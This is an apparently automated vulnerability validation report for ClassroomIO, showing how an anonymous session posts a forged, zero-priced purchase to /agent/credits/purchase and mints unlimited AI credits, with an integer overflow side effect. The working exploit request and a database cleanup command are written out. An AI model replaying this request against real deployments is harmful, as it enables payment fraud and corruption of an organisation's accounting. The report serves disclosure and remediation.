# VULN-004 — `/agent/credits/purchase` mints unlimited AI credits

**Software**: ClassroomIO
**Repository**: https://github.com/classroomio/classroomio
**Affected version**: 0.1.13 (package.json) — commit-pinned, no tagged release
**Status**: CONFIRMED
**Severity (static)**: High
**Target commit**: 0c356ad6f1a4d8449425b902afae58b3ebd9f443
**Validated at**: 2026-09-27

## Preconditions
- Any session. The exploit uses an **anonymous** better-auth session (VULN-018),
  so it is effectively **unauthenticated** — no signup, no org membership.

## Request
See `request.http`. Decisive request (with an anon session cookie):
```
POST /agent/credits/purchase
{"orgId":"48bbdff8-...","providerOrderId":"cvehunt-<random>","tokens":1000000000,
 "quantity":1,"unitPriceCents":0,"currency":"USD"}
```

## Response
`HTTP 200 {"success":true,"data":{"id":2,"orgId":"48bbdff8-…","provider":"polar",
"providerOrderId":"cvehunt-…","tokens":1000000000,…}}` — a fake `aiCreditPurchase`
ledger row is created and the org balance incremented.

## Observation
The static finding predicted an anon/any session could top up any org's balance with
no signature or membership check. Confirmed: an anonymous session (empty `orgRoles`,
`isAnonymous=true`) posted a forged purchase and the DB `ai_credit_balance.balance`
for the org rose by exactly 1,000,000,000 (observed `1000000000 → 2000000000` across
runs — each run with a fresh `providerOrderId` adds another 1e9, proving unbounded
minting). No Polar HMAC field exists anywhere in the schema.

## Side effects
- One row inserted into `ai_credit_purchase` per run (random `providerOrderId`).
- `ai_credit_balance.balance` for org `48bbdff8-…` increased by `tokens` each run.
- **Re-run note (2026-09-27):** `ai_credit_balance.balance` is a 4-byte `integer`
  (`schema.ts:3556`, max 2,147,483,647). Prior runs had saturated it near that max (2e9), so a
  further `+1e9` mint overflows int4 and Postgres 500s (`"Failed to record credit purchase"`).
  This is an incidental availability quirk of repeated exploitation, **not** a mitigation — the
  fixture balance was reset to 0 and the unauthenticated mint re-confirmed live (0 → 1e9). The
  int4 column also means an attacker can *break* an org's credit accounting by overflowing it.
  Cleanup (optional): `docker exec cio-postgres psql -U postgres -d classroomio -c
  "delete from ai_credit_purchase where provider_order_id like 'cvehunt-%'; update
  ai_credit_balance set balance=0 where org_id='48bbdff8-2ad5-46a3-a259-2ca3d52677dd';"`

## Research & references
- OWASP API Security Top 10 2023 — API5:2023 Broken Function Level Authorization and
  API3:2023 Broken Object Property Level Authorization (mass-assignment of `orgId`).
- OWASP Cheat Sheet "Webhook Security" / Polar webhook docs — the correct pattern is
  HMAC-signature verification of the raw body; this endpoint has none, so any client
  can impersonate the payment provider. Applied: send the webhook-shaped body directly.

## If FAILED
n/a — CONFIRMED.

## If NEEDS_MANUAL
n/a. (The downstream *spend* of minted credits needs a configured AI provider key,
but the vulnerability — arbitrary credit minting — is fully demonstrated here.)
